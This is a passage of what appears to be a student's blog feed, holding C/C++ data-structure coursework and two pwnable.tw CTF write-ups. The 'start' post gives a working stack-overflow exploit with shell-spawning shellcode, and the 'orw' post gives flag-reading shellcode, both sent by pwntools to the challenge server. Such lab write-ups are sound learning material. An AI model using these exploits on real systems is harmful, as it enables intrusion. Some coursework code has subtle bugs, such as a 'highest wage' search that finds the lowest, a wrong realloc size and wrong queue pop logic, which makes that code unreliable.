    double wages;

public:
    Teacher_Cadre(string &amp; n, string &amp; g, int age, string &amp; t, string &amp; p, double w) :
            Teacher(n, g, age, t), Cadre(n, g, age, p), wages(w) {}

    void show() const {
        this-&gt;Teacher::display();
//        cout &lt;&lt; &quot;post: &quot; &lt;&lt; post &lt;&lt; endl;
//        cout &lt;&lt; &quot;wage: &quot; &lt;&lt; wages &lt;&lt; endl;
        cout &lt;&lt; post &lt;&lt; &quot; &quot; &lt;&lt; wages &lt;&lt; endl;
    }
};

int main() {
    vector&lt;Teacher_Cadre&gt; people;
    string n, g, t, p; int age; double wage;
    for (int i = 0; i &lt; 3; i++) {
        cin &gt;&gt; n &gt;&gt; age &gt;&gt; g &gt;&gt; t &gt;&gt; p &gt;&gt; wage;
        people.emplace_back(Teacher_Cadre(n, g, age, t, p, wage));
    }
    // Find the highest wage.
    int ind = 0; double lowest = people[0].wages;
    for (int i = 0; i &lt; people.size(); i++) {
        if (lowest &gt; people[i].wages) {
            lowest = people[i].wages;
            ind = i;
        }
    }
    people[ind].show();
    return 0;
}
</code></pre>
<h1 id="数组排序">数组排序</h1>
<pre><code class="language-Markdown"># 题目描述
编写程序完成以下功能：
由键盘输入一系列数字组成一个数组，将改串数字从小到大进行排序操作，输出排好序的数组。

输入描述：
键盘随意输入一串数字
输出描述：
将输入的数字排序后进行输出。

# 样例输入输出
样例1
输入:
4 7 2 6 0 3 5 7 9
输出:
0 2 3 4 5 6 7 7 9
</code></pre>
<pre><code class="language-c++">#include &lt;bits/stdc++.h&gt;

using namespace std;

class Solution {
public:
    static void run() {
        vector&lt;int&gt; vec;
        int temp;
        while (cin &gt;&gt; temp) {
            vec.push_back(temp);
        }
        sort(vec.begin(), vec.end(), less&lt;int&gt;());
        for (int i = 0; i &lt; vec.size(); i++) {
            cout &lt;&lt; vec[i];
            if (i != vec.size()-1) cout &lt;&lt; &quot; &quot;;
        }
    }
};

int main() {
    Solution::run();
}
</code></pre>
<h1 id="附加题">附加题</h1>
<pre><code class="language-Markdown"># 题目描述
编写程序实现以下功能：
两两交换链表中的相邻节点，例如一个链表长度为4，1，2位节点进行交换，3，4位节点进行交换，输出交换后的链表。
1-&gt;2-&gt;3-&gt;4
变换为：
2-&gt;1-&gt;3-&gt;4

输入描述：
输入一系列数字代表一个链表
输出描述：
两两翻转后输出

# 样例输入输出
样例1
输入:
1 2 3 4
输出:
2 1 4 3
</code></pre>
<pre><code class="language-c++">#include &lt;bits/stdc++.h&gt;

using namespace std;

typedef struct Node {
    int val;
    Node * next;
    Node() : val(0), next(nullptr) {}
    explicit Node(int v) : val(v), next(nullptr) {}
    explicit Node(int v, Node * n) : val(v), next(n) {}
} Node;

class Solution {
public:
    static void run() {
        // 根据输入构建链表
        Node * head = new Node(-1);
        int temp;
        Node * h = head;
        while (cin &gt;&gt; temp) {
            Node * node = new Node(temp);
            h-&gt;next = node;
            h = h-&gt;next;
        }

        // 两两交换相邻结点
        h = head;
        while (h &amp;&amp; h-&gt;next) {
            // 后面两个结点都存在时进行翻转
            if (h-&gt;next &amp;&amp; h-&gt;next-&gt;next) {
                Node * node1 = h-&gt;next;
                Node * node2 = h-&gt;next-&gt;next;

                node1-&gt;next = node2-&gt;next;
                h-&gt;next = node2;
                node2-&gt;next = node1;
            }
            h = h-&gt;next-&gt;next;
        }

        // 打印输出
        h = head-&gt;next;
        while (h) {
            cout &lt;&lt; h-&gt;val;
            if (h-&gt;next != nullptr) cout &lt;&lt; &quot; &quot;;
            h = h-&gt;next;
        }
    }
};

int main() {
    Solution::run();
}
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Data Structure in C]]></title>
        <id>https://eclipse-yes.github.io/post/I404HkphT/</id>
        <link href="https://eclipse-yes.github.io/post/I404HkphT/">
        </link>
        <updated>2022-03-16T13:59:17.000Z</updated>
        <content type="html"><![CDATA[<h1 id="sequential-list">Sequential List</h1>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

#define DATA_TYPE int

// Definition.
typedef struct Vector {
	DATA_TYPE *data;
	int size, length;
} Vector;

// Construct a vector whose size is n.
Vector *init(int n) {
	Vector *vec = (Vector *)malloc(sizeof(Vector));
	vec-&gt;data = (int *)malloc(sizeof(DATA_TYPE) * n);
	vec-&gt;size = n;
	vec-&gt;length = 0;
	return vec;
}

// Destruct a vector.
void clear(Vector *vec) {
	if (vec == NULL) return;
	free(vec-&gt;data);
	free(vec);
}

// Expand a vector.
// return 0: expand failure.
// return 1: expand success.
int expand(Vector *vec) {
	// Secure Ways to use realloc, avoid memory leaking.
	int new_size = vec-&gt;size * 2;
	DATA_TYPE *p = (DATA_TYPE *)realloc(vec-&gt;data, sizeof(vec-&gt;data) * new_size);
	if (p == NULL) return 0;
	vec-&gt;size = new_size;
	vec-&gt;data = p;
	return 1;
}

// Insert an item into vector.
// return 0: insert failure.
// return 1: insert success.
int insert(Vector *vec, int pos, DATA_TYPE val) {
	// 3 illegal inserting cases.
	if (vec == NULL) return 0;
	if (vec-&gt;length == vec-&gt;size) {
		if (!expand(vec)) return 0;
		printf(&quot;expand vector size to %d success\n&quot;, vec-&gt;size);
	}
	if (pos &lt; 0 || pos &gt; vec-&gt;length) return 0;

	for (int i = vec-&gt;length; i &gt; pos; --i) {
		vec-&gt;data[i] = vec-&gt;data[i-1];
	}
	vec-&gt;data[pos] = val;
	vec-&gt;length += 1;
	return 1;
}

// Delete an item in vector.
// return 0: delete failure.
// return 1: delete success.
int del(Vector *vec, int pos) {
	// 3 illegal deleting cases.
	if (vec == NULL) return 0;
	if (vec-&gt;length == 0) return 0;
	if (pos &lt; 0 || pos &gt; vec-&gt;length-1) return 0;

	for (int i = pos; i &lt; vec-&gt;length-1; ++i) {
		vec-&gt;data[i] = vec-&gt;data[i+1];
	}
	vec-&gt;length -= 1;
	return 1;
}

// Print out a vector.
void print(Vector *vec) {
	printf(&quot;Vector(%d) = [&quot;, vec-&gt;length);
	for (int i = 0; i &lt; vec-&gt;length; ++i) {
		if (i != 0) printf(&quot;, &quot;);
		printf(&quot;%d&quot;, vec-&gt;data[i]);
	}
	printf(&quot;]\n&quot;);
}
</code></pre>
<h1 id="link-list">Link List</h1>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

#define DATA_TYPE int

// Define data structure: link list node.
typedef struct ListNode
{
    DATA_TYPE data;
    struct ListNode *next;
} ListNode;

// Define data structure: link list.
typedef struct LinkList
{
    ListNode head;
    int length;
} LinkList;

// Initialize a link list node, returning a pointer to list node.
ListNode *init_listnode(DATA_TYPE val)
{
    ListNode *p = (ListNode *)malloc(sizeof(ListNode));
    if (p == NULL)
        return NULL;
    p-&gt;data = val;
    p-&gt;next = NULL;
    return p;
}

// Initialize a link list, returnning a link list.
LinkList *init_linklist()
{
    LinkList *l = (LinkList *)malloc(sizeof(LinkList));
    if (l == NULL)
        return NULL;
    l-&gt;head.next = NULL;
    l-&gt;length = 0;
    return l;
}

// Destruct link list node.
void clear_listnode(ListNode *p)
{
    if (p == NULL)
        return;
    free(p);
    return;
}

// Destruct link list.
void clear_linklist(LinkList *l)
{
    if (l == NULL)
        return;
    ListNode *p = l-&gt;head.next, *q;
    while (p)
    {
        q = p-&gt;next;
        clear_listnode(p);
        p = q;
    }
    free(l);
    return;
}

// Insert a link list node.
// return 0, inserting fail.
// return 1, inserting success.
int insert(LinkList *l, int ind, DATA_TYPE val)
{
    if (l == NULL)
        return 0;
    if (ind &lt; 0 || ind &gt; l-&gt;length)
        return 0;
    ListNode *p = &amp;(l-&gt;head), *node = init_listnode(val);
    while (ind--)
        p = p-&gt;next;

    node-&gt;next = p-&gt;next;
    p-&gt;next = node;
    l-&gt;length += 1;
    return 1;
}

// Erase a link list node.
// return 0, erasing fail.
// return 1, erasing success.
int erase(LinkList *l, int ind)
{
    if (l == NULL)
        return 0;
    if (ind &lt; 0 || ind &gt; l-&gt;length - 1)
        return 0;
    ListNode *p = &amp;(l-&gt;head), *q;
    while (ind--)
        p = p-&gt;next;

    q = p-&gt;next;
    p-&gt;next = p-&gt;next-&gt;next;
    clear_listnode(q);
    l-&gt;length -= 1;
    return 1;
}

// Print out link list.
void output(LinkList *l)
{
    printf(&quot;LinkList(%d): &quot;, l-&gt;length);
    for (ListNode *p = l-&gt;head.next; p; p = p-&gt;next)
        printf(&quot;%d -&gt; &quot;, p-&gt;data);
    printf(&quot;NULL\n&quot;);
    return;
}
</code></pre>
<h1 id="queue">Queue</h1>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

#define DATA_TYPE int

typedef struct Queue
{
    DATA_TYPE *data;
    int head, tail;
    int size, len;
} Queue;

Queue *init(int n) {
    Queue * que = (Queue *)malloc(sizeof(Queue));
    que-&gt;data = (DATA_TYPE *)malloc(sizeof(int) * n);
    que-&gt;len = que-&gt;head = que-&gt;tail = 0;
    que-&gt;size = n;
    return que;
}

void clear(Queue *que) {
    if (que == NULL) return;
    free(que-&gt;data);
    free(que);
    return;
}

int empty(Queue *que) {
    return que-&gt;len == 0;
}

DATA_TYPE front(Queue *que) {
    return que-&gt;data[que-&gt;head];
}

int push(Queue *que, DATA_TYPE val) {
    if (que == NULL) return 0;
    if (que-&gt;len == que-&gt;size) return 0;
    que-&gt;data[que-&gt;tail++] = val;
    que-&gt;tail %= que-&gt;size;
    que-&gt;len++;
    return 1;
}

int pop(Queue *que) {
    if (que == NULL) return 0;
    if (empty(que)) return 0;
    que-&gt;head %= (que-&gt;head + 1);
    que-&gt;len--;
    return 1;
}

void output(Queue *que) {
    printf(&quot;queue = [&quot;);
    for (int head = que-&gt;head, i = 0; i &lt; que-&gt;len; ++i) {
        int ind = (head + i) % que-&gt;size;
        printf(&quot;%d&quot;, que-&gt;data[ind]);
        if (ind != que-&gt;tail-1) printf(&quot;, &quot;);
        else printf(&quot;]\n&quot;);
    }
}
</code></pre>
<h1 id="stack">Stack</h1>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

#define DATA_TYPE int

typedef struct Stack {
    DATA_TYPE *data;
    int top, size;
} Stack;

Stack *init(int n) {
    Stack *sta = (Stack *)malloc(sizeof(Stack));
    sta-&gt;data = (DATA_TYPE *)malloc(sizeof(DATA_TYPE) * n);
    sta-&gt;size = n;
    sta-&gt;top = -1;
    return sta;
}

void clear(Stack *sta) {
    if (sta == NULL) return;
    free(sta-&gt;data);
    free(sta);
    return;
}

int empty(Stack *sta) {
    if (sta == NULL) return NULL;
    return sta-&gt;top == -1;
}

int top(Stack *sta) {
    if (sta == NULL) return NULL;
    if (empty(sta)) return NULL;
    return sta-&gt;data[sta-&gt;top];
}

int push(Stack *sta, DATA_TYPE val) {
    if (sta == NULL) return 0;
    if (sta-&gt;top == sta-&gt;size - 1) return 0;
    sta-&gt;data[++sta-&gt;top] = val;
    return 1;
}

int pop(Stack *sta) {
    if (sta == NULL) return 0;
    if (empty(sta)) return 0;
    sta-&gt;top--;
    return 1;
}

void output(Stack *sta) {
    printf(&quot;stack(%d) = [&quot;, sta-&gt;top + 1);
    for (int i = 0; i &lt; sta-&gt;top + 1; i++) {
        printf(&quot;%d&quot;, sta-&gt;data[i]);
        if (i != sta-&gt;top) printf(&quot;, &quot;);
        else printf(&quot;]&quot;);
    }
}
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Challenge 2. orw (pwnable.tw)]]></title>
        <id>https://eclipse-yes.github.io/post/JEOBoEHyt/</id>
        <link href="https://eclipse-yes.github.io/post/JEOBoEHyt/">
        </link>
        <updated>2022-03-16T06:02:29.000Z</updated>
        <content type="html"><![CDATA[<pre><code>❯ file orw
orw: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e60ecccd9d01c8217387e8b77e9261a1f36b5030, not stripped
❯ checksec orw
[*] '/root/share/pwn/work/pwnable.tw/2.orw/orw'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
</code></pre>
<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
{
  orw_seccomp();
  printf(&quot;Give my your shellcode:&quot;);
  read(0, &amp;shellcode, 0xC8u);
  ((void (*)(void))shellcode)();
  return 0;
}
</code></pre>
<p>输入编写的shellcode，并执行getshel。<br>
提示: Read the flag from <code>/home/orw/flag</code>. Only <code>open</code> <code>read</code> <code>write</code> syscall are allowed to use.</p>
<p>sys_open(eax=0x5, ebx=file_addr_str)<br>
sys_read(eax=0x3, ecx=ebx(buff_addr), ebx=0x3(fd), edx=0x50(len))<br>
sys_write(eax=0x4, ebx=0x1(fd))</p>
<pre><code class="language-python">#!/usr/bin/env python
# coding=utf-8

from pwn import *

#io = process('./orw')
io = remote(&quot;chall.pwnable.tw&quot;,10001)

shellcode = asm(&quot;&quot;&quot;
                xor     eax, eax
                xor     ecx, ecx
                mov     eax, 0x5
                push    ecx
                push 	0x67616c66       
                push 	0x2f77726f       
                push 	0x2f656d6f       
                push 	0x682f2f2f
                mov     ebx, esp
                int     0x80
                mov     eax, 0x3
                mov     ecx, ebx
                mov     ebx, 0x3
                mov     dl, 0x50
                int     0x80
                mov     eax, 0x4
                mov     bl, 0x1
                int     0x80
                &quot;&quot;&quot;)

io.sendafter(&quot;Give my your shellcode:&quot;, shellcode)
io.interactive()
</code></pre>
<pre><code>; syscall: open('/home/orw/flag')
xor     eax, eax
xor     ecx, ecx
mov     eax, 0x5

push    ecx         ; \x00 string end
push 	0x67616c66  ; flag
push 	0x2f77726f  ; orw/
push 	0x2f656d6f  ; ome/     
push 	0x682f2f2f  ; ///h
mov     ebx, esp
int     0x80

; syscall: read
mov     eax, 0x3
mov     ecx, ebx ; ebx is the buf addr
mov     bl, 0x3 ; fd: 0,1,2,3-&gt;file
mov     dl, 0x50 ; len
int     0x80

; syscall: write
mov     eax, 0x4
mov     bl, 0x1 ; fd: stdout
int     0x80
</code></pre>
<p>Other wps<br>
Reference: https://pwnable.tw/writeup/2/184 by akiym</p>
<pre><code>.intel_syntax noprefix
.globl _start
_start:
    jmp loadstring
file_read:
    pop ebx
    xor eax,eax
    xor ecx,ecx
    xor edx,edx
    mov al,0x5
    int 0x80

    mov ebx,eax
    mov ecx,esp
    mov dl,0x40
    mov al,0x3
    int 0x80

    xchg eax,edx
    mov bl,0x1
    mov al,0x4
    int 0x80

    ret
loadstring:
    call file_read
    .asciz &quot;/home/orw/flag&quot;
</code></pre>
<pre><code>% asm -i sc.S -o sc
% nc chall.pwnable.tw 10001 &lt; sc
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Challenge 1. start (pwnable.tw)]]></title>
        <id>https://eclipse-yes.github.io/post/lHAnG6xjF/</id>
        <link href="https://eclipse-yes.github.io/post/lHAnG6xjF/">
        </link>
        <updated>2022-03-16T04:14:26.000Z</updated>
        <content type="html"><![CDATA[<p>拖入IDS，查看汇编代码</p>
<pre><code>.text:08048060                 public _start
.text:08048060 _start          proc near               ; DATA XREF: LOAD:08048018↑o
.text:08048060                 push    esp
.text:08048061                 push    offset _exit
.text:08048066                 xor     eax, eax
.text:08048068                 xor     ebx, ebx
.text:0804806A                 xor     ecx, ecx
.text:0804806C                 xor     edx, edx
.text:0804806E                 push    3A465443h
.text:08048073                 push    20656874h
.text:08048078                 push    20747261h
.text:0804807D                 push    74732073h
.text:08048082                 push    2774654Ch
.text:08048087                 mov     ecx, esp        ; addr
.text:08048089                 mov     dl, 14h         ; len
.text:0804808B                 mov     bl, 1           ; fd 1: stdout
.text:0804808D                 mov     al, 4           ; write
.text:0804808F                 int     80h             ; LINUX - sys_write
.text:08048091                 xor     ebx, ebx        ; fb 0: stdin
.text:08048093                 mov     dl, 3Ch ; '&lt;'   ; len
.text:08048095                 mov     al, 3           ; read
.text:08048097                 int     80h             ; LINUX - sys_read
.text:08048099                 add     esp, 14h
.text:0804809C                 retn
.text:0804809C _start          endp ; sp-analysis failed
</code></pre>
<p>从汇编代码中可以看出，长度为0x14的字符串全被压入了栈中；同时write打印0x14的字符串，而read读入0x3C的字符串，此处有栈溢出漏洞。并且通过checksec命令可以得出本程序没有开任何的保护，想到的漏洞利用方法便是把shellcode写入栈中，然后控制程序执行流到shellcode处即可getshell。</p>
<p>第一次输入的时候，输入0x14填充字符，外加0x08048087的地址，控制程序跳到这个地址处，再次执行write系统调用，输出esp作为地址的0x14长度字符串，由于_start开始的时候push了一个esp的值，接受前4个字节，即可以得到old esp地址。接下来，构造payload：0x14长度的填充字符，加上返回到shellcode的地址(<strong>注意: 由于取出的是之前push进去的esp的值，所以shellcode地址计算是+0x14而不是现在esp对应的+0x18</strong>)，加上符合长度要求的shellcode。</p>
<figure data-type="image" tabindex="1"><img src="https://eclipse-yes.github.io/post-images/1647404158636.png" alt="" loading="lazy"></figure>
<p>Debug小技巧：<br>
python file: <code>raw_input('&gt;')</code>; terminal: <code>gdb -p $(pidof start)</code></p>
<pre><code class="language-python">#!/usr/bin/env python
# coding=utf-8

from pwn import *
context(os='linux', arch='i386', log_level='debug')
#io = process('./start')
io = remote(&quot;chall.pwnable.tw&quot;, 10000)

offset = 0x14
mov_ecx_esp = 0x08048087
#shellcode = asm(shellcraft.i386.linux.sh()) length does not meet requirement.
shellcode = b&quot;\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&quot;

payload = b'a'*offset + p32(mov_ecx_esp)
io.sendafter(&quot;Let's start the CTF:&quot;, payload)

old_esp = u32(io.recv(4))
payload = b'a'*offset + p32(old_esp + 0x14) + shellcode
io.send(payload)
io.interactive()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Data Stucture Report: Calculating Expression]]></title>
        <id>https://eclipse-yes.github.io/post/hsq3C-u7T/</id>
        <link href="https://eclipse-yes.github.io/post/hsq3C-u7T/">
        </link>
        <updated>2022-03-15T04:27:06.000Z</updated>
        <content type="html"><![CDATA[<h1 id="实验题目表达式求值">实验题目：表达式求值</h1>
<h2 id="一-问题描述">一、问题描述</h2>
<p>设计一个中缀表达式求值的程序。此中缀表达式中涉及到的运算符有：(、)、+(加)、-(减)、*(乘)、/(除)、%(取余)、^(求幂)。程序需要处理这段中缀表达式的输入，并且判断表达式的正确性；如果表达式正确，则输出表达式的值；如果表达式非法，则输出规定的错误信息。并且，此中缀表达式中涉及到的操作数运算均为double浮点类型相关的运算。</p>
<p>关于输入与输出的要求：输入为中缀表达式，每个表达式占一整行；输出在表达式正确时为表达式求值的结果（精确到小数点后两位），在表达式错误时输出”ERROR IN INFIX NOTATION”这个错误提示信息。</p>
<h2 id="二-算法描述">二、算法描述</h2>
<h3 id="21-概述">2.1 概述</h3>
<p>表达式一般来说有三种：前缀表达式、中缀表达式、后缀表达式，其中后缀表达式又叫做逆波兰表达式。中缀表达式是最符合人们思维方式的一种表达式，顾名思义，就是操作符在操作数的中间。而前缀表达式和后缀表达式中操作符分别在操作数的前面和操作数的后面。</p>
<p>针对本实验的问题，会有两个解决的方案。第一种是，先将中缀表达式转换为后缀表达式，然后进行后缀表达式求值计算；第二种是，直接进行中缀表达式的求值计算。那么，中缀表达式和后缀表达式之间的区别是什么呢？两者的区别在于，中缀表达式更加符合人类的思维模式，不过需要括号进行辅助表达；而后缀表达式不需要括号就可以展现出哪部分的运算先进行，不需要去考虑优先级的问题，因此后缀表达方式恰好更加符合计算机的处理机制，对于计算机来说处理起来更加方便简单。在本次实验中，最后进行代码实现的算法是直接中缀表达式的求值计算。</p>
<h3 id="22-中缀表达式求值">2.2 中缀表达式求值</h3>
<h4 id="221-文字描述">2.2.1 文字描述</h4>
<p>对于中缀表达式求值来说，最直接的方式是使用两个栈，一个存放操作符，另一个存<br>
放操作数。所以在处理中缀表达式字符串的时候，算法可以把需要处理的类型分为操作数类型和操作符类型。当遇到操作数的时候，直接把其压入存放操作数的栈中。操作符可以被分为三种情形去处理：当遇到的操作符为 ‘(‘ (左括号)时，直接将其压入存放操作符的栈中；当遇到的操作符为 ‘)’ (右括号)时，存放操作符的栈反复出栈计算，直到遇到左括号为止；当遇到的操作符为其他的时，讲此刻的操作符与栈顶的进行比较，若此刻的操作符优先级更高，则压入栈中，若优先级更低，则反复出栈计算直到栈顶操作符优先级小于此刻的操作符或栈为空后，将其压入栈中。</p>
<p>当处理完中缀表达式字符串中，如果操作符栈不为空，则将其中剩余的操作符配合操作数栈尽数弹出并且进行计算，直到操作符栈为空，操作数栈只有一个计算结果元素。此时，将结果输出即程序成功运行。</p>
<h4 id="222-表达式错误检测">2.2.2 表达式错误检测</h4>
<p>对于中缀表达式求值算法而言，还有两个细节点需要处理。第一个是负号的问题，由于负号和减号在表示上相同，本算法实现中使用 ‘#’ 字符去替换负号的原本的 ‘-’ 字符来进行处理。由算式的计算规则可知，只有当 ‘-’ 字符在 ‘)’ 左括号和数字的右侧时，才表示为减号，其余的地方都表示为负号。解决方式为，在进行计算之前，先对表达式字符串进行处理，筛选出负号字符，并将其转换为 ‘#’ 字符。</p>
<p>第二个是中缀表达式错误判定问题。会产生错误表达式的情况有：非法字符；括号不匹配；运算符不匹配。非法字符，即在中缀表达式字符串中出现了不被允许的字符；解决方式为，在计算之前的处理中加入规则逻辑进行判定。括号不匹配和运算符不匹配的判定方式为，程序最后是否出现多个操作数在栈中，或者操作数不够用，或者操作数和操作符不匹配的情况。解决方式为，在算法设计的类中规定一个布尔变量，当错误表达式被检测出来的时候，更新变量的值，并且在主程序中设定判定语句，及时检测出来，并输出错误信息然后退出程序。</p>
<h4 id="223-核心代码实现原理">2.2.3 核心代码实现原理</h4>
<p>针对两个栈的需求，在算法中采用C++的STL中vector类型来模拟栈的操作；push_back作为压栈方法，pop_back作为出栈方法，back作为查看栈顶元素方法。对于表达式中单个子式的计算，采用Switch语句判断不同的运算符进行计算。另外，通过一个map类型常量来帮助算法判定运算符的优先级。</p>
<h4 id="223-流程图描述">2.2.3 流程图描述</h4>
<p>遍历中缀表达式字符串的流程图展示：<br>
<img src="https://eclipse-yes.github.io/post-images/1647318670380.png" alt="" loading="lazy"><br>
字符串遍历结束，处理后续剩下两个栈的流程图展示：<br>
<img src="https://eclipse-yes.github.io/post-images/1647318690510.png" alt="" loading="lazy"></p>
<h2 id="三-运行测试">三、运行测试</h2>
<table>
<thead>
<tr>
<th>测试编号</th>
<th>测试目的</th>
<th>输入</th>
<th>输出</th>
<th>正确性</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>括号不匹配检测</td>
<td>1+2(</td>
<td>ERROR IN INFIX NOTATION</td>
<td>✅</td>
</tr>
<tr>
<td>2</td>
<td>括号不匹配检测</td>
<td>1+2()3</td>
<td>ERROR IN INFIX NOTATION</td>
<td>✅</td>
</tr>
<tr>
<td>3</td>
<td>括号不匹配检测</td>
<td>123*12+(12+63^2</td>
<td>ERROR IN INFIX NOTATION</td>
<td>✅</td>
</tr>
<tr>
<td>4</td>
<td>非法字符检测</td>
<td>6e3*9</td>
<td>ERROR IN INFIX NOTATION</td>
<td>✅</td>
</tr>
<tr>
<td>5</td>
<td>非法字符检测</td>
<td>6+(#3)</td>
<td>ERROR IN INFIX NOTATION</td>
<td>✅</td>
</tr>
<tr>
<td>6</td>
<td>操作符错误检测</td>
<td>7+/89-35%10</td>
<td>ERROR IN INFIX NOTATION</td>
<td>✅</td>
</tr>
<tr>
<td>7</td>
<td>除0错误检测</td>
<td>1/0</td>
<td>ERROR IN INFIX NOTATION</td>
<td>✅</td>
</tr>
<tr>
<td>8</td>
<td>模0错误检测</td>
<td>1012%0</td>
<td>ERROR IN INFIX NOTATION</td>
<td>✅</td>
</tr>
<tr>
<td>9</td>
<td>复杂运算检测</td>
<td>2.5+(2^3/2)%3</td>
<td>3.50</td>
<td>✅</td>
</tr>
<tr>
<td>10</td>
<td>复杂运算检测</td>
<td>11/2%20</td>
<td>5.50</td>
<td>✅</td>
</tr>
<tr>
<td>11</td>
<td>复杂括号检测</td>
<td>3+5*(5+2+3*(5/5+2/(3-2)+5)%2)-2</td>
<td>36.00</td>
<td>✅</td>
</tr>
<tr>
<td>12</td>
<td>多乘方运算检测</td>
<td>2^2^3</td>
<td>256.00</td>
<td>✅</td>
</tr>
</tbody>
</table>
<h2 id="四-总结">四、总结</h2>
<p>实验测试的结果显示，本报告中的算法可以覆盖要求的所有运算符的运算，并且可以支持整数、小数的正确运算。从简单的表达式到复杂的多层次多嵌套的表达式，算法都能输出正确的结果。对于模运算不仅支持整型的运算，浮点数的运算功能也正确实现。同时，对于中缀表达式错误检测而言，在括号匹配检测、非法字符检测、操作符错误检测中都表现优秀，能够得到正确的结果；并且，对于除0和摸0错误计算的检测功能也得以实现。由此可以得出结论，该算法对于中缀表达式求值可以计算出正确的结果，对表达式的各种错误情况也可以正确判定；另外，该算法没有使用两层以上的循环逻辑，减少不必要的内存开销，时空复杂度的表现也非常可观。</p>
<h3 id="附录源代码">附录：源代码</h3>
<p><img src="https://eclipse-yes.github.io/post-images/1647318746389.png" alt="" loading="lazy"><br>
<img src="https://eclipse-yes.github.io/post-images/1647318753167.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[NKUCS OJ Problems: Data Structure]]></title>
        <id>https://eclipse-yes.github.io/post/asqm5mIBn/</id>
        <link href="https://eclipse-yes.github.io/post/asqm5mIBn/">
        </link>
        <updated>2022-03-13T06:56:24.000Z</updated>
        <content type="html"><![CDATA[<h1 id="求最大收益">求最大收益</h1>
<pre><code class="language-Markdown"># 题目描述
已知某一只股票的每一日收盘价格，假设只可以进行一次先买后卖，求每股最大收益。

输入：
先输入包含的股票价格数量，然后输入股票价格（大于0的整数）。
输出：
最大收益。
如果是递减，最大收益为0。

# 样例输入输出
样例1
输入:
3
4 3 2
输出:
0
样例2
输入:
5
9 10 6 9 5
输出:
3
</code></pre>
<p>Mind Palace: dynamic programming.</p>
<pre><code class="language-c++">#include &lt;iostream&gt;
#include &lt;vector&gt;
#include &lt;algorithm&gt;

using std::cout; using std::cin; using std::endl;
using std::vector;

class Solution {
public:
    int getMaxProfit() {
        int size; cin &gt;&gt; size;
        if (size &lt; 2) return 0;
        vector&lt;int&gt; prices = vector&lt;int&gt;(size);
        for (int i = 0; i &lt; size; ++i)
            cin &gt;&gt; prices[i];
        int maxProfit = 0, minPrice = prices[0];
        for (const auto&amp; price : prices) {
            if (price &gt; minPrice)
                maxProfit = std::max(maxProfit, price - minPrice);
            else
                minPrice = price;
        }

        return maxProfit;
    }
};

int main() {
    int res = Solution().getMaxProfit();
    cout &lt;&lt; res &lt;&lt; endl;
    return 0;
}
</code></pre>
<h1 id="互斥字符串">互斥字符串</h1>
<pre><code class="language-Markdown"># 题目描述
给定一个仅含有英文大小写字母的字符串序列 s，若其中任意两个相邻字符都不是同一个字母的大小写形式，则称其为互斥字符串。
程序需要将给定的字符串转换为互斥字符串。aa为互斥，aA和Aa为非互斥。
程序的每次操作可以从字符串中选出满足上述条件的两个相邻字符并删除，直到字符串整理好为止。
注：若最终结果为空字符串，请输出 -1。

要求时间复杂度O(n)

Input Format
输入由一行字符串组成。测试样例保证答案唯一。
Output Format
输出一行，为输入字符串经过若干次删除操作得到的互斥字符串。

Example
Input
abBAcCc
Output
c

# 说明
该样例存在多种转换路径，但最终输出相同
&quot;abBAcCc&quot; --&gt; &quot;aAcCc&quot; --&gt; &quot;cCc&quot; --&gt; &quot;c&quot;
&quot;abBAcCc&quot; --&gt; &quot;abBAc&quot; --&gt; &quot;aAc&quot; --&gt; &quot;c&quot;

# 样例输入输出
样例1
输入:
abBAcCc
输出:
c
样例2
输入:
AaBbCcDd
输出:
-1
</code></pre>
<p>Mind Palace: single stack.</p>
<pre><code class="language-c++">#include &lt;iostream&gt;
#include &lt;string&gt;
#include &lt;vector&gt;

using std::cout; using std::cin; using std::endl;
using std::string; using std::vector;

class Solution {
public:
    bool judgeMutex(char c1, char c2) {
        if (c1 - c2 == 0x20 || c1 - c2 == -0x20) return false;
        return true;
    }
    void run() {
        string cinStr; cin &gt;&gt; cinStr;
        vector&lt;char&gt; stk;
        for (uint i = 0; i &lt; cinStr.size(); ++i) {
            // If stack is empty, push char.
            if (stk.empty()) {
                stk.push_back(cinStr[i]);
                continue;
            }
            // If stack.top() and cinStr[i] is mutexed, pop char.
            if (!this-&gt;judgeMutex(stk.back(), cinStr[i]))
                stk.pop_back();
            // If stack.top() and cinStr[1] is not mutexed, push char.
            else
                stk.push_back(cinStr[i]);
        }
        if (stk.empty()) {
            cout &lt;&lt; -1;
            return;
        }
        for (uint i = 0; i &lt; stk.size(); ++i)
            cout &lt;&lt; stk[i];
    }
};

int main() {
    Solution().run();
    return 0;
}
</code></pre>
<h1 id="linux路径">linux路径</h1>
<pre><code class="language-Markdown"># 题目描述
给定一个非最简的Linux文件绝对路径，将其简化为标准的Linux文件绝对路径。
在Linux文件路径中，一个英文句号 . 表示当前目录，两个连续的英文句号 .. 表示返回到上一级目录。
标准的Linux文件绝对路径具有以下特点
第一个字符为斜杠 /
两个目录名称直接有且仅有一个斜杠 /
除根目录外，路径结尾不能为斜杠 /
不会出现一个英文句号 . 或者两个连续的英文句号 ..

# Input Format
输入由一行字符串组成，为非最简的Linux文件绝对路径。

# Output Format
输出一行，为最简化的Linux文件绝对路径。

# Example
## Input
/aaa/../../bbb/ccc/..///./..
## Output
/
## 说明
路径从根目录开始从左往右进行解析
aaa 表示进入根目录下 aaa 目录
